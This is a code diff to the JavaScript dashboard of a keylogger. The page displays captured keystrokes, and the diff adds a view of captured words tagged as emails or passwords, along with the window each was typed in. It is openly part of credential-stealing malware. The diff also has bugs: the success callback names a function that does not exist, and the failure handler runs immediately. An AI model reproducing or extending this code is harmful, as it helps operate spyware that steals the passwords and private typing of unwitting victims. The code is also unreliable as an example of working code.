@@ -2,12 +2,11 @@ $(document).ready(function(){
     //when page loads, show the contents of the keylogger
     $('.container > #keyAll').show();
     showKeys();
-      
-  
-    })
-  
+    showWords();
+      })
+
   // request and display all the keys collected
-  function showKeys() {
+function showKeys() {
     $.ajax({
       url: "./showKeylog",
       method: "GET",
@@ -16,26 +15,10 @@ $(document).ready(function(){
       fail: console.log("FAILED")
     });
     console.log("help");
-  }
+}
   
-  function showKeyTable(keys){
+function showKeyTable(keys){
     $('#keyAll > table > tbody').empty();
-  
-    /*for (const [key,value] of Object.entries(keys)){
-      var k = JSON.parse(value);
-	  console.log(k);
-      $('#keylogView > table > tbody').append(
-        '<tr><td>'
-        + k.datetime
-        +'</td><td>'
-        + k.isKeyDown
-        +'</td><td>'
-        + k.windowName
-        +'</td><td>'
-	    + k.processedKey
-	    +'</td></tr>'
-      );
-    } */
     keys.forEach((item) => {
         console.log(item)
         $('#keylogView > table > tbody').append(
@@ -50,4 +33,36 @@ $(document).ready(function(){
     	    +'</td></tr>'
         )
     })
-  }
+}
+    
+    // request and display all the words collected
+function showWords() {
+    $.ajax({
+      url: "./showWordlog",
+      method: "GET",
+      dataType: 'json',
+      success: showWordable,
+      fail: console.log("FAILED")
+    });
+    console.log("help");
+}
+  
+function showWordTable(words){
+    $('#wordAll > table > tbody').empty();
+    words.forEach((item) => {
+        console.log(item)
+        $('#wordlogView > table > tbody').append(
+            '<tr><td>'
+            + item.datetime
+            +'</td><td>'
+            + item.windowName
+            +'</td><td>'
+            + item.processedWord
+            +'</td><td>'
+    	    + item.isEmail
+    	    +'</td><td>'
+    	    + item.isPassword
+    	    +'</td></tr>'
+        )
+    })
+}
